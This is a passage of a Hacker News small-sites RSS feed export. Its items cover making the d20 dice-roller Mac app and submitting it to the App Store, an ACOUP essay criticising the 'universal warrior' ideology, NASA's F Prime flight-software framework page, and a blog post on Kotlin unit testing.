<p>These three images should give you an idea about the progression of UI design. Of course, I feel that the third version is far superior. I do think it‚Äôs funny how my color scheme seems to be trending pink-ward.</p>
<figure>
<img loading="lazy" src="https://i2.wp.com/blakewatson.com/wp/wp-content/uploads/2019/05/d20-main.png?resize=1024%2C640&amp;ssl=1" alt="D20 version 1 promotional screenshot. Basically a grid of buttons witb a list of dice roll results running down the left side of the window." width="1024" height="640" srcset="https://i2.wp.com/blakewatson.com/wp/wp-content/uploads/2019/05/d20-main.png?resize=1024%2C640&amp;ssl=1 1024w, https://i2.wp.com/blakewatson.com/wp/wp-content/uploads/2019/05/d20-main.png?resize=300%2C188&amp;ssl=1 300w, https://i2.wp.com/blakewatson.com/wp/wp-content/uploads/2019/05/d20-main.png?resize=768%2C480&amp;ssl=1 768w, https://i2.wp.com/blakewatson.com/wp/wp-content/uploads/2019/05/d20-main.png?w=1280&amp;ssl=1 1280w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"><br>
</figure>
<figure>
<img loading="lazy" src="https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2019/06/screenshot-1.png?resize=1024%2C640&amp;ssl=1" alt="d20 version 2 promotional screenshot. Dice buttons along the right side of the window. A large text input runs along the top with a list of dice roll results underneath." width="1024" height="640" srcset="https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2019/06/screenshot-1.png?resize=1024%2C640&amp;ssl=1 1024w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2019/06/screenshot-1.png?resize=300%2C188&amp;ssl=1 300w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2019/06/screenshot-1.png?resize=768%2C480&amp;ssl=1 768w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2019/06/screenshot-1.png?w=1440&amp;ssl=1 1440w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"><br>
</figure>
<figure>
<img loading="lazy" src="https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/1.png?resize=1024%2C640&amp;ssl=1" alt="Screenshot of d20, showing a rollformula in a text input with multiple results underneath. Captioned &quot;An elegant, powerful dice roller.&quot;" width="1024" height="640" srcset="https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/1.png?resize=1024%2C640&amp;ssl=1 1024w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/1.png?resize=300%2C188&amp;ssl=1 300w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/1.png?resize=768%2C480&amp;ssl=1 768w, https://i1.wp.com/blakewatson.com/wp/wp-content/uploads/2021/02/1.png?w=1440&amp;ssl=1 1440w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"><br>
</figure>
<p>I take the UI design seriously and the lack of nicely designed dice rollers on the Mac App Store was a big reason I made d20 originally. I‚Äôm pretty happy with how it turned out and I‚Äôm hoping to start getting sales information from Apple really soon to find out whether users agree.</p>
<h2>Problems and solutions</h2>
<p>I said earlier that I was beginning to run up against problems in v2. Many of those I have addressed in v3.</p>
<p>One of the major ones is what I‚Äôm calling ‚Äúmulti-roll.‚Äù The easiest way to describe this is that it lets you roll attack and damage at the same time. Technically, what it is doing is letting you separate different formulas with a comma but roll them at the same time. This means that you can also <em>save</em> them together, which means that now you can have a weapon as a preset button and clicking will roll the attack and the damage simultaneously, with each having its own result entry.</p>
<p>Another big problem was that v2 presets were simplistic‚Äîjust a list of buttons that each can roll one combo. If you have multiple characters, good luck rummaging through all your presets to find the ones you need.</p>
<p>I‚Äôm tackling this in v3 by introducing the concept of ‚Äúpreset groups,‚Äù which let you create different lists of presets (e.g., one per character). This plus multi-roll solve the biggest annoyances I had with v2.</p>
<h2>Submitting to the Mac App Store is hard</h2>
<p>Seriously, that was harder than building the app. There are a lot of articles recommending <code>electron-forge</code> but there‚Äôs not much help out there about what happens when something doesn‚Äôt work.</p>
<p>I ended up using its parts directly: <code>electron-packager</code>, <code>electron-osx-sign</code>, and <code>electron-osx-flat</code>. This topic deserves its own article probably but in summary:</p>
<ul>
<li>You need a ‚ÄúMac App Distribution‚Äù certificate from Apple.</li>
<li>You need a ‚Äúprovisioning profile‚Äù from Apple.</li>
<li>You need the entitlements files‚ÄîI just grab these off of the <a href="https://www.electronjs.org/docs/tutorial/mac-app-store-submission-guide">Electron site</a>, but if the app needs any special entitlements, you have to add those. For example: <code>com.apple.security.network.client</code> if your app needs to hit the web for stuff.</li>
<li>You need to package the app with <code>electron-packager</code>, which requires you have the aforementioned Apple cert installed onto your keychain.</li>
<li>You need to sign the app with <code>electron-osx-sign</code>.</li>
<li>You need to turn the <code>.app</code> into an installer with <code>electron-osx-flat</code>.</li>
<li>You need to send the resulting installer to Apple using their app called Transporter.</li>
</ul>
<p>Here are the three npm scripts I used to package, sign, and prep the installer for distribution on the Mac App Store:</p>
<pre><code>{
  "scripts": {
    "package": "electron-packager . d20 --out=out --platform=mas --arch=x64 --appBundleId=com.example.app_name --icon=./images/d20_icon --no-deref-symlinks --overwrite",
    "sign:mas": "electron-osx-sign out/d20-mas-x64/d20.app --entitlements=entitlements/parent.plist --entitlements-inherit=entitlements/child.plist --entitlements-loginhelper=entitlements/loginhelper.plist",
    "installer": "electron-osx-flat out/d20-mas-x64/d20.app --platform=mas"
  }
}
</code></pre>
<p>These resources helped me out a lot:</p>
<ul>
<li><a href="https://www.electronjs.org/docs/tutorial/mac-app-store-submission-guide">https://www.electronjs.org/docs/tutorial/mac-app-store-submission-guide</a></li>
<li><a href="https://epxx.co/artigos/electronsign.html">https://epxx.co/artigos/electronsign.html</a></li>
<li><a href="https://github.com/electron/electron-packager">electron-packager</a></li>
<li><a href="https://github.com/electron/electron-osx-sign">electron-osx-sign</a></li>
</ul>
<h2>Web vs app stores</h2>
<p>To be honest, I would have loved to just deploy d20 as a web app. But unfortunately it‚Äôs hard to get traffic to a web app versus getting the built-in audience an app store provides. It‚Äôs one thing to charge for a Mac app, but try to charge for a website that rolls dice and suddenly it seems ridiculous. I don‚Äôt know if there‚Äôs an app-store-like website for distributing web apps (<a href="https://itch.io/">itch.io</a> maybe?) but I doubt a web version would have had the same success (10-20 copies sold per month) that the Mac App Store provides with $0 of marketing effort.</p>
<p>It‚Äôs a technical challenge building an Electron version and a web version from the same codebase, but providing some kind of web version is on my radar. As much as I would love to go cross-platform and distribute Windows and Linux versions, I don‚Äôt have a good way to test those platforms. And my specific setup for working on my Mac (which I need thanks to my disability) isn‚Äôt conducive to OS or device switching. But at least providing a web version would open it up to more platforms.</p>
<h2>By the numbers</h2>
<p>In conclusion, here are some random stats/numbers for your amusement.</p>
<ul>
<li><strong>3.5</strong> years on the Mac App Store</li>
<li><strong>203</strong> commits across all versions</li>
<li><strong>d1,000,000:</strong> the largest die d20 v3 can roll</li>
<li><strong>100:</strong> number of random integers d20 requests from RANDOM.ORG when you roll a die</li>
<li><strong>$3.99:</strong> the price of d20 v1</li>
<li><strong>04/2020:</strong> highest grossing month ($200)</li>
<li><strong>$3.41k</strong> in lifetime total sales (before Apple‚Äôs cut)</li>
</ul>

                                            </div>
                </article>

            
            </div></div>]]>
            </description>
            <link>https://blakewatson.com/journal/the-making-of-d20-version-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199638</guid>
            <pubDate>Fri, 19 Feb 2021 23:52:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Collections: The Universal Warrior, Part III: The Cult of the Badass]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26199396">thread link</a>) | @jrott
<br/>
February 19, 2021 | https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the third and final part of a discussion (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">IIb</a>) discussion of the notion that there is a ‚Äòuniversal warrior‚Äô ‚Äì a transcendent sameness about either the experience of war or ‚Äòwarrior values‚Äô which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p>Over the last three weeks, we‚Äôve looked at the historical evidence to see if there was any hint of some universal war experience or set of warrior values.  What we‚Äôve found instead is that almost everything about how humans engage in war, aside from the fact that they do so, varies tremendously from one culture to the next, from one place to the next, from one period to the next.  Cultural expectations, social values, technological conditions, entire systems of warfare and simple circumstance also condition the experience of war and the values that combatants have in extreme ways which render the search for a ‚Äòuniversal‚Äô set of warrior values a clearly doomed enterprise.</p>



<p>But, as laid out in the beginning, the ‚Äòuniversal warrior‚Äô wasn‚Äôt merely a (deeply flawed) argument about the structure and experiences of the past, but the foundation stone in an ideological blueprint for living one‚Äôs modern life.  And so it is time now that we turn from the (quite bad) historical roots of this idea to the (worse, it turns out) ideological implications of the idea.</p>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(I couldn‚Äôt decide quite how I wanted to illustrate this essay and it didn‚Äôt seem like quite the right content for historical cat photos, so I‚Äôve opted to leave it without images.  I may go back and add pictures at a later date, but for now, it can stand purely as an essay.)</p>



<h2>Once More, With Feeling</h2>



<p>In a sense, while the previous three posts have been fun, they were really just a very long preamble to the argument I am making here, so I want to both lay out <em>why</em> I opened with a three-week long preamble before getting to the point (‚Äòhow else would you know it was me?‚Äô) and also pull together the conclusions from all of that before we move forward.</p>



<p>So why the preamble?  Because I wanted to make sure before we started discussing the underlying ideology that lurks <em>behind</em> claims of the universality of some ‚Äòwarrior ethos‚Äô we had defused the retort that, whatever the unpleasant implications, the ‚Äòuniversal warrior‚Äô was <em>historically true</em>.  This had to be done first because <strong>I am of the opinion that</strong> <strong>truth is an absolute defense</strong> in such matters; the universe contains a great many facts which are frustratingly inconvenient, yet as historians we have to deal with the world as it is rather than as we wish it to be (or wish it to have been).  Consequently, before I could complain about the ideology, it was necessary to determine if the historical theory was true, or even remotely plausible.</p>



<p>So we have spent three weeks hunting for the ‚Äòuniversal warrior‚Äô ‚Äì either in the form of a universal war <em>experience</em> or a universal set of <em>values</em>.  What we have found is:</p>



<ul><li>Far from there being one set way that combatants relate to their society, soldiers, warriors and civilians represent distinct categories defined by how people in war relate to their society.  Even <em>within</em> those categories, variety is considerable, leaving no one clear model of how combatants relate to their societies.</li><li>Moreover, war itself is changeable, moving through at least three (and probably four) distinct systems of land warfare alone, each with substantial differences in tactics, values, and experiences.</li><li>Moreover, different cultures understand and imagine the ideal qualities of combatants differently, often so dramatically differently that one culture‚Äôs definition of courage is not merely different from an other‚Äôs, but diametrically opposed.</li><li>Moreover, the actual experience of battle ‚Äì we discussed this mostly through the experience of fear ‚Äì isn‚Äôt universal either.  The fear of facing a cavalry charge is not the same sort of fear as the fear of enduring a week long artillery barrage, while ‚Äòwar is scary‚Äô in a general sense is hardly enough to set off the warrior or the soldier from any number of other scary and potentially hazardous jobs.</li><li>Moreover, the bonds of comradeship that support modern cohesion (often cited as a unique and universal experience) are, in fact, also historically contingent, both in that there are many systems for generating cohesion, not all of which involve tight bonds formed during military service and that some military systems don‚Äôt seek to develop cohesion in this sense at all.</li><li>Moreover, attitudes towards the hardships of war <em>also</em> vary wildly, as do the actual hardships in question.</li><li>Moreover, not only do different societies express different attitudes and values towards the wounded, but the nature of the wounds themselves has changed over time as military technology has become progressively more lethal; both states that apply not only to physical, but also mental wounding.</li></ul>



<p>In short, while there is enough commonality in war to suggest a definition that encompasses the idea (again, I rather prefer W. Lee‚Äôs definition of war as ‚Äúorganized group activity, conducted with lethal effects, that diminishes one [unconsenting] group for the benefit of another‚Äù), <em>within </em>that definition, <strong>there is far too much variety to suggest there is any one ‚Äòuniversal‚Äô experience of war or any one set of universal warrior values</strong>.</p>



<p>And I should note this is something we could demonstrate in more than a half-dozen different ways deploying just a fraction of the available scholarship on how the experience and values of war change from place to place.  Indeed, that is essentially what we have done.  <strong>Any <em>one</em> of the above points is enough to be fatal to the notion that there is some sort of ‚Äòuniversal‚Äô set of warriors values and experiences </strong>such that, as Pressfield openly states, a Spartiate could be simply dropped into a modern U.S. Marine regiment and fit in without skipping a beat (or his equally anachronistic notion that the decadent Athenian could be dropped into American civil society and also integrate seamlessly).  </p>



<p>But of course Pressfield isn‚Äôt offering a <em>history</em> (and indeed, he has not written one), he is offering an ideology and (intentionally or not) reshaping the historical facts to fit that ideology, shaving the corners off of the square peg so it will fit into the round hole of his moral assumptions.  His ideology requires a universal set of warrior values to serve as the foundation for his life philosophy and so, facts be damned, he <em>will</em> assert the existence of such a universal set of values.  The ideology, not the history, is the foundation, which is why Pressfield offers both anecdotes from Plutarch (a historical source) and his own books (modern historical fiction) as having equal truth value, even though the latter has no value as historical evidence; they both <strong>express the ideology</strong>.</p>



<p>So what is the ideology here?  Well, for that it is time to meet our old friend‚Ä¶</p>



<h2>The Cult of the Badass</h2>



<p>Pulling out the core ideology from Pressfield‚Äôs <a href="https://stevenpressfield.com/category/the-warrior-archetype/">videos </a>is a formidable task; there are fifty of them and so much of the core argument is submerged beneath endless anecdotes (some historical, some Pressfield openly invented for his historical fiction; all delivered with insufficient historical context).  But Pressfield‚Äôs videos are useful for this argument because he makes explicit a set of arguments which are usually only made <em>implicitly</em> through a set of emotional appeals which often are carried through the subtext of images and references rather than the text of what is being said.</p>



<p>(Marching through Pressfield‚Äôs videos was also frankly difficult because there are <a href="https://twitter.com/BretDevereaux/status/1350655580562731011"><em>just so many errors</em> </a>in them, I had to stop live-tweeting my way through them because if I kept doing it I‚Äôd never finish.  As a reminder, this is a fellow whose fiction<a href="https://en.wikipedia.org/wiki/Gates_of_Fire"> is on reading lists </a>at various U.S. military officer training programs, much to my continued sorrow.)</p>



<p>We may, I think, summarize Pressfield‚Äôs core argument as follows: the ‚Äòwarrior archetype‚Äô (he is using here the long-abandoned psychology of Carl Jung) represents a true human universal best understood by certain ‚Äòwarrior societies‚Äô (<em>especially</em> the Spartans, but also Alexander III, but somehow <em>not</em> the Macedonians or Philip II) who supposedly demonstrated martial excellence and who therefore are ‚Äúrepresentative of the purest expression of the warrior archetype‚Äù (his words).  Moreover, Pressfield argues that this understanding of the ‚Äòinner warrior‚Äô provides the best blueprint on which a person might fashion their lives, understanding their weaknesses as an ‚Äòinner enemy‚Äô that must be opposed by ‚Äòwarrior values‚Äô and ‚Äòmental toughness.‚Äô  And while Pressfield will admit that the ‚Äòwarrior archetype‚Äô can go astray (he says this of Alexander, though I‚Äôd argue that Alexander didn‚Äôt so much ‚Äògo astray‚Äô as he ‚Äòkept doing what he had done literally for his entire life, but began doing it to people who thought Alexander would only hurt people <em>they didn‚Äôt like</em>‚Äò), he nevertheless presents this ‚Äòwarrior archetype‚Äô as an expression of the highest possible human ideal.  <strong>In Pressfield‚Äôs ideological framework, it is the great warriors ‚Äì the Spartans, Alexander, Arjuna ‚Äì who stand atop the summit of human physical and moral achievement.</strong>  Non-warriors (mostly women) are valued in as much as they uphold elements of this warrior ideal so that warriors (mostly men) can give those ideals physical expression in action.  Even internal struggles must be reframed as a form of war, to be fought and defeated with the same values that best produce effective real-world violence.</p>


</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/">https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199396</guid>
            <pubDate>Fri, 19 Feb 2021 23:20:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[F‚Äô: Flight Software and Embedded Systems Framework]]>
            </title>
            <description>
<![CDATA[
Score 135 | Comments 26 (<a href="https://news.ycombinator.com/item?id=26199346">thread link</a>) | @zeristor
<br/>
February 19, 2021 | https://nasa.github.io/fprime/ | <a href="https://web.archive.org/web/*/https://nasa.github.io/fprime/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        <p>F¬¥ is a software framework for rapid development and deployment of embedded systems and spaceflight applications.
Originally developed at NASA‚Äôs Jet Propulsion Laboratory, F¬¥ is open source software that has been successfully deployed
for several space applications. It has been used for, but is not limited to, CubeSats, SmallSats, instruments, and
deployables.</p>

<p>F¬¥ has the following features:</p>
<ul>
  <li>Component architecture with well-defined interfaces</li>
  <li>C++ framework providing core capabilities like queues, threads, and operating-system abstraction</li>
  <li>Tools for designing systems and automatically generating code from systems design</li>
  <li>A standard library of flight-worthy components</li>
  <li>Testing tools for unit and system-level testing</li>
</ul>

<table>
  <thead>
    <tr>
      <th>F¬¥ Resources</th>
      <th>&nbsp;</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Features</td>
      <td><a href="https://nasa.github.io/fprime/features.html">Features</a></td>
    </tr>
    <tr>
      <td>Projects</td>
      <td><a href="https://nasa.github.io/fprime/projects.html">Projects</a></td>
    </tr>
    <tr>
      <td>Installation</td>
      <td><a href="https://nasa.github.io/fprime/INSTALL.html">INSTALL.md</a></td>
    </tr>
    <tr>
      <td>Tutorials</td>
      <td><a href="https://nasa.github.io/fprime/Tutorials/README.html">Tutorials</a></td>
    </tr>
    <tr>
      <td>User Guide</td>
      <td><a href="https://nasa.github.io/fprime/UsersGuide/guide.html">User Guide</a></td>
    </tr>
    <tr>
      <td>Repository</td>
      <td><a href="https://github.com/nasa/fprime">https://github.com/nasa/fprime</a></td>
    </tr>
    <tr>
      <td>Community Forum and Mailing List</td>
      <td><a href="https://groups.google.com/d/forum/fprime-community">https://groups.google.com/d/forum/fprime-community</a></td>
    </tr>
    <tr>
      <td>Community GitHub Organization</td>
      <td><a href="https://github.com/fprime-community">https://github.com/fprime-community</a></td>
    </tr>
    <tr>
      <td>Standard Reference Application</td>
      <td><a href="https://github.com/nasa/fprime/blob/master/Ref/README.md">Ref</a></td>
    </tr>
    <tr>
      <td>Raspberry PI Reference Application</td>
      <td><a href="https://github.com/nasa/fprime/blob/master/RPI/README.md">RPI</a></td>
    </tr>
    <tr>
      <td>Architecture Overview</td>
      <td><a href="https://nasa.github.io/fprime/Architecture/FPrimeArchitectureShort.pdf">Architecture</a></td>
    </tr>
  </tbody>
</table>

<h2 id="f-system-requirements">F¬¥ System Requirements</h2>

<p>In order to develop applications with F¬¥, the following requirements of the user‚Äôs system must be met.</p>

<ol>
  <li>Linux or Mac OS X operating system (or Windows Subsystem for Linux on Windows)</li>
  <li>CMake <a href="https://cmake.org/download/">https://cmake.org/download/</a> available on the system path</li>
  <li>Bash or Bash compatible shell</li>
  <li>CLang or GCC compiler</li>
  <li>Python 3 and PIP <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></li>
</ol>

<h2 id="quick-installation-guide">Quick Installation Guide</h2>

<p>F¬¥ can be quickly installed and ready to use by cloning the GitHub repository, installing Python code (typically in a
virtual environment), and building on of our reference applications. For full install instructions please see:
<a href="https://nasa.github.io/fprime/INSTALL.html">INSTALL.md</a>.</p>

<p><strong>Clone and Install</strong></p>
<div><div><pre><code>git clone https://github.com/nasa/fprime.git
cd fprime
pip install --upgrade wheel setuptools pip
pip install Fw/Python Gds/
</code></pre></div></div>
<p><strong>Build the Ref Application</strong></p>
<div><div><pre><code>cd Ref
fprime-util generate
fprime-util install
</code></pre></div></div>
<p><strong>Run the Ref Application</strong></p>


<h2 id="further-references">Further References</h2>

<p>Full information on the code and F¬¥ are available at our Github page:
<a href="http://github.com/nasa/fprime">http://github.com/nasa/fprime</a>.</p>

<p>To start with, follow the <a href="https://nasa.github.io/fprime/INSTALL.html">installation guide</a>. Then inspect
either the <a href="https://github.com/nasa/fprime/blob/master/Ref/README.md">reference application</a>, 
<a href="https://github.com/nasa/fprime/blob/master/RPI/README.md">rapberry pi reference</a>, or the
<a href="https://nasa.github.io/fprime/Tutorials/README.html">tutorials</a>.</p>

      </section>
    </div></div>]]>
            </description>
            <link>https://nasa.github.io/fprime/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26199346</guid>
            <pubDate>Fri, 19 Feb 2021 23:16:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unit Testing as a first-class Citizen]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26199330">thread link</a>) | @robholmes
<br/>
February 19, 2021 | https://robholmes.app/posts/unit-testing-as-a-first-class-citizen/ | <a href="https://web.archive.org/web/*/https://robholmes.app/posts/unit-testing-as-a-first-class-citizen/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I often see unit testing completely overlooked until after code is written, and I have been hugely guilty of this in the past. Testing can sometimes be seen as taking longer, doesn‚Äôt add perceived value, or it‚Äôs too complicated. I‚Äôm going to try and change those perceptions, to help you or others around you see why tests are just as important as the code itself!</p>

<p>There are many reasons why you should test your code, and all of them will help <strong>you!</strong> Unit testing your code is not to satisfy some code coverage statistic, it is a tool to do the following:</p>
<h2 id="1-it-proves-your-code-works-as-intended-">1. it proves your code works as intended üéâ</h2>
<p>It is easy to write a block of code making a slight logic error no matter how good you think your code looks, perhaps an accidental inversion of logic (<code>==</code> instead of <code>!=</code>), forgetting a <code>null</code> check, or just being under a time pressure. It happens to everyone, so testing your code will save self-embarrassment, and catch issues before your code makes it anywhere near production.</p>
<p>Well tested code will prove each path through your code, and ensure you get the expected output for a given input.</p>
<h2 id="2-it-stops-unintended-behaviour-changes-">2. it stops unintended behaviour changes üî•</h2>
<p>In as little as a weeks time you will have probably moved onto something else, and the code you‚Äôve just written will be out of your mind. Without tests in place, you or someone else could make a change which breaks the original intention of the code without realising. If you‚Äôre lucky maybe a tester or QA check will spot the behaviour change, but more than likely it will slip into production code and become a bug.</p>
<p>Well tested code will ensure the behaviour and original intention of the code remains in place, until you choose to change the tests and therefore intentionally change the behaviour.</p>
<h2 id="3-it-documents-your-code-">3. it documents your code üìñ</h2>
<p>After a certain amount of time your memory will fade and you‚Äôll forget the original reason for various parts of your code. One day you or a colleague may want to use or tweak the code, but not quite understanding the original reasoning.</p>
<p>Well written tests will act as a document of why the code does what it does, or why it provides a certain output.</p>
<h2 id="4-it-saves-you-time-">4. it saves you time ‚åö</h2>
<p>No really‚Ä¶ so often we think that writing tests adds a lot of time and if we just skip them we can deliver things faster. Stop for a minute and consider all the things that you do whilst writing new feature X, perhaps you build some UI, write some code to fetch some data, render the data in the UI, build the app, start tapping buttons and manually testing it does what you needed. Great you‚Äôve built your new feature, what‚Äôs next? Perhaps you‚Äôve covered all the scenarios in your manual test, but what usually happens is that you test the happy path where not a lot goes wrong, and you forgot to test with WiFi switched off, or with a slow connection, etc. Then next week when you build feature Y, will you go through all that manual testing again for feature X, of course not as there won‚Äôt be much time for coding soon!</p>
<p>So well written tests will save you time, sanity, and as the next point will demonstrate will free your mind to create better code.</p>
<h2 id="5-it-frees-your-mind-">5. it frees your mind üß†</h2>
<p>When building a simple application by yourself you can sometimes maintain the whole picture of what the app does, and how everything touches and affects each other. But once someone else is working on the same codebase, or the codebase becomes too large, it‚Äôs harder and harder to maintain the whole picture.</p>
<p>Well written tests can be run at anytime to prove that your code behaves as intended and hasn‚Äôt been accidentally broken by a change somewhere else in the code, freeing your mind to concentrate on just the unit of code your are working on, safe in the knowledge you aren‚Äôt breaking anything else.</p>
<h2 id="6-it-makes-you-a-better-programmer-">6. it makes you a better programmer üåü</h2>
<p>Seriously, if you want to be a better programmer, get better results, less bugs, more ‚Äúit just works‚Äù moments, then start writing tests that give you even more confidence in your code, and once you treat tests as first class citizens among your codebase, you immediately level-up as a programmer!</p>
<h2 id="7-it-is-fun-">7. it is fun! üòÄ</h2>
<p>You probably became a programmer because you enjoy creating apps or programs with all the challenges that brings, and tests are just programs, so if you like programming, you should like writing tests! They‚Äôre written in the same language, come with great tools, and can be challenging to write.</p>
<p>There is also a huge sense of satisfaction when you write a test that catches a problem you hadn‚Äôt spotted or intended.</p>
<hr>

<p>Quite simply, you should test everything where possible. There‚Äôs no good reason to think that some parts of your code are ineligible for testing, and where there is a will there is a way.</p>
<h2 id="types-of-output-to-test">Types of output to test</h2>
<p>There are 2 types of output that you need to prove in your tests:</p>
<h3 id="1-asserting-the-return-value-of-a-function">1. asserting the return value of a function</h3>
<p>When your function returns a value then you <strong>MUST</strong> assert that it is the expected value.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>Calculator</span>() {

  <span>fun</span> <span>multiply</span>(a: Int, b: Int) = a * b
}
</code></pre></div><div><pre><code data-lang="kotlin"><span>class</span> <span>CalculatorTests</span> {

  <span>@Test</span> <span>fun</span> <span>`multiply should return 4 when a = 2, b = 2`</span>() {
    <span>val</span> result = Calculator().multiply(<span>2</span>, <span>2</span>)
    assertEquals(<span>4</span>, result)
  }

  <span>@Test</span> <span>fun</span> <span>`multiply should return 32 when a = 8, b = 4`</span>() {
    <span>val</span> result = Calculator().multiply(<span>8</span>, <span>4</span>)
    assertEquals(<span>32</span>, result)
  }
}
</code></pre></div><p>These tests assert that the result is correct given the different arguments, ensuring the calculation is working as expected.</p>
<h3 id="2-verifying-calls-to-external-dependency-functions">2. verifying calls to external dependency functions</h3>
<p>When your function calls another function on a dependency then you <strong>SHOULD</strong> verify that it‚Äôs been called with the expected arguments.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>Calculator</span>(
  <span>private</span> <span>val</span> piProvider: PiProvider
) {

  <span>fun</span> <span>piTo10Places</span>() = piProvider.generate(decimalPlaces = <span>10</span>)
}
</code></pre></div><div><pre><code data-lang="kotlin"><span>class</span> <span>CalculatorTests</span> {

  <span>private</span> <span>lateinit</span> <span>var</span> mockPiProvider: PiProvider

  <span>@Before</span> <span>fun</span> <span>setUp</span>() {
    <span>// stub the generate function to return the correct value
</span><span></span>    every { mockPiProvider.generate(decimalPlaces = <span>10</span>) } returns <span>3.1415926535</span>
  }

  <span>@Test</span> <span>fun</span> <span>`piTo10Places should generate pi to 10 places`</span>() {
    <span>val</span> result = Calculator(mockPiProvider).piTo10Places()
    <span>// assert result is the expected value
</span><span></span>    assertEquals(<span>3.1415926535</span>, result)
    
    <span>// verify our mock was called with the right argument of 10
</span><span></span>    verify { mockPiProvider.generate(decimalPlaces = eq(<span>10</span>)) }
  }
}
</code></pre></div><p>This test verifies the call to the dependency has been called with the correct arguments and ensures the behaviour is expected.</p>
<h3 id="or-a-combination-of-both">or a combination of both</h3>
<p>In reality your functions will probably be a little more complex (but not too much, remember KISS and SRP principles) than those examples and there may be a little more to assert and verify. Often you‚Äôll want to use a combination of assertions and verifications, but try to keep your test structured like this.</p>
<div><pre><code data-lang="kotlin"><span>@Test</span> <span>fun</span> <span>`example test`</span>() {
  <span>// setup stubs and mocks where needed
</span><span></span>
  <span>// call the function under test
</span><span></span>
  <span>// assert the results and verify the calls
</span><span></span>}
</code></pre></div><hr>

<p>The key to testing successfully is to have a testing mindset, by this I mean you should have testing on your mind whenever thinking about, planning, or writing code. The more you write tests, the more this will happen naturally, so don‚Äôt worry if it‚Äôs hard to start with.</p>
<h2 id="imagine-or-actually-write-down-all-the-outcomes">Imagine (or actually write down) all the outcomes</h2>
<p>When you‚Äôre starting out creating a function or class, it helps to imagine or actually create some blank test scenarios for each outcome you want to achieve.</p>
<h3 id="item-repository">Item Repository</h3>
<p>Let‚Äôs say we need to create a repository to get some imaginary items, we know we need to get lists of items to display a list view, individual items by their ID for a detailed view of the item, and we‚Äôd like to cache them in to speed up fetching them next time.</p>
<p>So let‚Äôs write some quick test cases down of the various scenarios or outcomes that could happen. Now this doesn‚Äôt have to cover absolutely everything, as we might want to add some extra coverage once we get into the implementation later.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>ItemRepositoryTests</span> {

  <span>@Test</span> <span>fun</span> <span>`findAll should return items from API and store in cache when not cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findAll should return items from cache when already cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findAll should return empty list when not available in cache or API`</span>() {}

  <span>@Test</span> <span>fun</span> <span>`findById should return item from API and store in cache when not cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findById should return item from cache when already cached`</span>() {}
  <span>@Test</span> <span>fun</span> <span>`findById should return null when not available in cache or API`</span>() {}
}
</code></pre></div><p>As you can see, the tests are doing nothing right now, but we have detailed what we expect to happen in the different scenarios, so now we can start implementing a class to achieve those scenarios.</p>
<div><pre><code data-lang="kotlin"><span>class</span> <span>ItemRepository</span>(
  <span>private</span> <span>val</span> api: ItemApi,
  <span>private</span> <span>val</span> cache: ItemCache,
) {

  <span>fun</span> <span>findAll</span>(): List&lt;Item&gt; =
    cache.all() <span>?:</span> api.all()<span>?.</span>also { cache.putAll(<span>it</span>) } <span>?:</span> emptyList()
  
  <span>fun</span> <span>findById</span>(id: String): Item? =
    cache.findById(id) <span>?:</span> api.findById(id)<span>?.</span>also { cache.put(<span>it</span>) }
}
